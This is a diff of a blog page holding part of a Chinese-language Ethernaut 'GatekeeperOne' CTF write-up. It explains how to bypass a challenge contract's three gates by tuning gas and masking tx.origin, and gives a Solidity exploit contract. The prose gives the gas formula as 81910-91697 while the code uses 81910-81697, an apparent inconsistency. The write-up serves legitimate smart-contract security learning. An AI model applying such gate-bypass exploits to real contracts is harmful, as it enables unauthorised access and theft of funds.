@@ -412,9 +412,9 @@
         <category>Solidity</category>
       </categories>
       <tags>
-        <tag>Blockchain</tag>
         <tag>xctf final</tag>
         <tag>Happy_DOuble_Eleven</tag>
+        <tag>Blockchain</tag>
       </tags>
   </entry>
   <entry>
@@ -449,9 +449,9 @@
         <category>Solidity</category>
       </categories>
       <tags>
+        <tag>Blockchain</tag>
         <tag>Hackergame</tag>
         <tag>JCBank</tag>
-        <tag>Blockchain</tag>
       </tags>
   </entry>
   <entry>
@@ -769,11 +769,15 @@
 </li>
 </ul>
 <p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/16.png" alt></p>
-<pre><code>- 调试到 `gateTwo` 的 `msg.gas` 地方，此时 `remaining gas = 81697`
-</code></pre><p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/17.png" alt></p>
-<pre><code>- 那么这个过程间消耗的 `gas = 81910 - 81697`，加上 `gas` 本身消耗的 `2` 即可，所以为了满足 `gateTwo`，在进入 `enter` 之前的 `gas` 可以设置为 `81910-91697+81910+2`
-</code></pre><ul>
-<li><code>gateThree</code> 也比较简单，最后的逻辑是将 <code>tx.origin</code> 倒数三四字节换成 <code>0000</code> 即可，可以通过 <code>bytes8(tx.origin) &amp; 0xFFFFFFFF0000FFFF</code> 实现</li>
+<ul>
+<li>调试到 <code>gateTwo</code> 的 <code>msg.gas</code> 地方，此时 <code>remaining gas = 81697</code></li>
+</ul>
+<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/17.png" alt></p>
+<ul>
+<li><p>那么这个过程间消耗的 <code>gas = 81910 - 81697</code>，加上 <code>gas</code> 本身消耗的 <code>2</code> 即可，所以为了满足 <code>gateTwo</code>，在进入 <code>enter</code> 之前的 <code>gas</code> 可以设置为 <code>81910-91697+81910+2</code></p>
+</li>
+<li><p><code>gateThree</code> 也比较简单，最后的逻辑是将 <code>tx.origin</code> 倒数三四字节换成 <code>0000</code> 即可，可以通过 <code>bytes8(tx.origin) &amp; 0xFFFFFFFF0000FFFF</code> 实现</p>
+</li>
 </ul>
 <h2 id="Solution-11"><a href="#Solution-11" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"> </span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.gas % <span class="number">8191</span> == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    <span class="built_in">require</span>(uint32(_gateKey) == uint16(_gateKey));</span><br><span class="line">    <span class="built_in">require</span>(uint32(_gateKey) != uint64(_gateKey));</span><br><span class="line">    <span class="built_in">require</span>(uint32(_gateKey) == uint16(tx.origin));</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">enter</span>(<span class="params">bytes8 _gateKey</span>) <span class="title">public</span> <span class="title">gateOne</span> <span class="title">gateTwo</span> <span class="title">gateThree</span>(<span class="params">_gateKey</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">contract MyAgent &#123;</span><br><span class="line">    GatekeeperOne c;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">MyAgent</span>(<span class="params">address _c</span>) </span>&#123;</span><br><span class="line">        c = GatekeeperOne(_c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        bytes8 _gateKey = bytes8(msg.sender) &amp; <span class="number">0xffffffff0000ffff</span>;</span><br><span class="line">        c.enter.gas(<span class="number">81910</span><span class="number">-81697</span>+<span class="number">81910</span>+<span class="number">2</span>)(_gateKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>调用 <code>exploit()</code> 即可<br><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/18.png" alt><br><br></p>
